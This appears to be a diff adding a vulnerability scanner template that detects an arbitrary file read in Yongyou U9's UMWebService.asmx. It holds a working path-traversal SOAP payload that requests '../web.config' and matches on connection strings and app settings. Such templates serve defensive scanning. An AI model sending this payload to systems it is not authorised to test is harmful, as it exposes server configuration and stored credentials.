@@ -1,0 +1,41 @@
+id: yongyou-u9-umwebservice-asmx-anyfile-read
+
+info:
+  name: Yongyou U9 UMWebService.asmx Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in Yongyou U9 UMWebService.asmx by sending a crafted SOAP request to attempt reading the 'web.config' file.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/u9/OnLine/UMWebService.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: http://tempuri.org/GetLogContent
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <GetLogContent xmlns="http://tempuri.org/">
+      <fileName>../web.config</fileName>
+      </GetLogContent>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "configSections"
+          - "appSettings"
+          - "connectionStrings"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
